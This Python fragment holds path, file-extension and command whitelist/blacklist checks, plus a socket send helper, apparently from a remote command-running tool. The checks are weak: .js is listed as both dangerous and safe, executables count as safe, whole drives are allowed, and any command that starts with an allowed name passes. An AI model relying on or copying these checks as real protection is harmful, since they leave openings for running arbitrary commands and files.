def _is_safe_path(path):
    """Check path safety"""
    # Allowed drives
    allowed_paths = [
        os.path.expanduser("~"),
        "C:\\",
        "D:\\",
        "E:\\",
        os.environ.get("TEMP", ""),
        os.environ.get("TMP", ""),
    ]
    try:
        abs_path = os.path.abspath(path)
        for allowed in allowed_paths:
            if abs_path.startswith(os.path.abspath(allowed)):
                return True
    except Exception:
        pass
    return False

def _is_safe_file(path):
    """Check file safety"""
    # Dangerous blocked files
    dangerous_extensions = [
        ".vbs", ".js", ".jse", ".wsf", ".wsh", ".scr",
        ".bat", ".cmd", ".msi", ".com", ".pif", ".gadget",
    ]
    # Safe files
    safe_extensions = [
        ".txt", ".log", ".csv", ".json", ".xml", ".html", ".htm",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico",
        ".mp3", ".mp4", ".avi", ".mkv", ".mov",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
        ".exe", ".dll", ".sys", ".ocx",
    ]
    
    try:
        ext = os.path.splitext(path)[1].lower()
        if ext in safe_extensions:
            return True
        if ext in dangerous_extensions:
            return False
        return True  # Allow the rest with caution
    except Exception:
        return False

def _is_safe_command(command):
    """Check command safety - Whitelist + Blacklist"""
    if not command or not command.strip():
        return False
    
    # Check blocked keywords first
    lower_cmd = command.lower()
    for blocked in BLOCKED_KEYWORDS:
        if blocked.lower() in lower_cmd:
            return False
    
    # Extract base command
    parts = command.strip().split()
    if not parts:
        return False
    
    base_cmd = parts[0].lower()
    
    # Check whitelist
    if base_cmd in ALLOWED_COMMANDS:
        return True
    
    # Check compound commands (e.g. "net start")
    if len(parts) > 1:
        combined = f"{base_cmd} {parts[1].lower()}"
        if combined in ALLOWED_COMMANDS:
            return True
    
    # Commands starting with allowed commands
    for allowed in ALLOWED_COMMANDS:
        if lower_cmd.startswith(allowed + " ") or lower_cmd == allowed:
            return True
    
    return False

def _get_command_hash(command):
    try:
        import hashlib
        return hashlib.sha256(command.encode("utf-8", errors="replace")).hexdigest()[:16]
    except Exception:
        return command[:16]


def send_all(sock, data, lock=None):
    """Send all data (legacy - for compatibility)"""
    if lock:
        lock.acquire()
    try:
        total = 0
        while total < len(data):
            sent = sock.send(data[total:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total += sent
    finally:
        if lock:
            lock.release()

